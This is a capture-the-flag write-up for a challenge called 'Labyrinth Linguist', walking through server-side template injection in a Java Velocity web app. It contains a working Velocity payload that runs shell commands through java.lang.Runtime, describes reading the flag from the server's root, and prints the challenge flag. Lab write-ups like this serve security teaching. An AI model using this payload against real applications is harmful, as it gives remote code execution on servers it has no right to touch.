# Labyrinth Linguist

## Enumeration

The web application shows a simple submit box to translate english to a made up language with some crazy unreadable font:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/8c317022-3aec-4349-bd57-7ec6a2c836e5)

Looking through the provided source code, we see it is Java based and using the Velocity template library.
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/6a269172-7dc4-498a-a476-02b72400d500)

No sign of user input sanitization in our text parameter so we should be good to go to try Server Side Template Injection:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/5d20dac8-289f-4b2d-a2c4-6b6ae4189343)

Testing with a standard payload for this template, we have confirmed SSTI when we see the classic 49.

```
#set ($run=7*7) $run
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/1be46e51-0cd9-4154-9791-4061fe1cc9be)

## Solution
Getting code execution isn't too difficult, a quick google search gives us the first link:  
[https://antgarsil.github.io/posts/velocity/](https://antgarsil.github.io/posts/velocity/)  
But we can find the same payload on [Hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#velocity-java) as well.

However, both payloads needs to be adjusted a bit because they don't seem to work out of the box. After a bit of back and forth with ChatGPT, we can reach this payload to get code execution:  

```
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id')) $ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))#end
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/56b1dad3-4fe4-4735-b372-f0d680b54101)

From the source code we already know our flag is in the root directory but we need to know the exact name:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/86b64d9f-993f-4182-906c-94c90a363652)

Trying to read it with a wildcard breaks our syntax:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/5e452603-6d17-4b14-bbcf-424cf7fef3dd)

So we just take another step to list it to get the name:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/17b962cc-e93a-4525-aeea-49c4ac62d910)

And now we can read it:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/9d6811d5-622b-4554-b33c-774a4ed5500d)

`HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!}`
